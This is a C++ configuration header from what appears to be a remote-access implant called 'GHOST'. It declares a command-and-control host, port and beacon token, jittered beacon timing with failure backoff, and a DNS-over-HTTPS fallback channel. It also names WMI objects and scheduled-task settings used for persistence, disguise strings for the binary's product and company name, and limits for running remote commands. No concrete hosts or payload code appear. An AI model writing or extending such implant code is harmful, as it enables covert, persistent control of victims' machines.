#pragma once
#include <string>
#include <cstdint>

namespace config {

    extern const uint16_t C2_PORT;

    const wchar_t* GetBeaconToken();
    const wchar_t* GetUserAgent();
    const wchar_t* GetC2Host();
    // DoH resolver endpoint for the fallback transport (src/doh.cpp + the
    // fallback block in src/c2.cpp). Build-time override: -DGHOST_DOH_URL=...
    const wchar_t* GetDohUrl();

    // Beacon timing — values in SECONDS (override at build time:
    // -DGHOST_BEACON_MIN=n -DGHOST_BEACON_MAX=n, or build.sh prompts/env)
#ifndef GHOST_BEACON_MIN
#define GHOST_BEACON_MIN 18
#endif
#ifndef GHOST_BEACON_MAX
#define GHOST_BEACON_MAX 24
#endif
    constexpr uint32_t BEACON_MIN = GHOST_BEACON_MIN;
    constexpr uint32_t BEACON_MAX = GHOST_BEACON_MAX;

    // Consecutive-failure backoff (applied by BeaconFailureBackoff in src/c2.cpp):
    //   wait = BEACON_MIN * BACKOFF_FACTOR^(failures-1)
    // growing until MAX_FAILURES consecutive failures, then holding, and always
    // capped at BACKOFF_MAX_SEC. Defaults: 18 -> 54 -> 162 -> 486 -> 1458s held.
    constexpr uint32_t MAX_FAILURES    = 5;      // failures before the interval holds
    constexpr uint32_t BACKOFF_FACTOR  = 3;      // multiplier per failure step
    constexpr uint32_t BACKOFF_MAX_SEC = 1800;    // absolute ceiling (30 min)

    // DNS-over-HTTPS fallback (src/doh.cpp; policy in src/c2.cpp):
    //   DOH_IP_TTL_SEC       — how long a literal that has carried a request
    //                          leads before the hostname path is retried;
    //   DOH_FAIL_BACKOFF_SEC — minimum gap between failed resolution attempts.
    constexpr uint32_t DOH_IP_TTL_SEC       = 300;
    constexpr uint32_t DOH_FAIL_BACKOFF_SEC = 60;

    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;

    constexpr DWORD CMD_OUTPUT_MAX = 65536;
    constexpr DWORD CMD_TIMEOUT_MS = 30000;

    // How long the persistence helpers wait for schtasks.exe before giving up
    // on reading its exit code (src/persistence.cpp RunHidden). A timeout is
    // reported as unknown, not as failure. Was hardcoded 10000 at three sites.
    constexpr DWORD SCHTASKS_TIMEOUT_MS = 10000;
}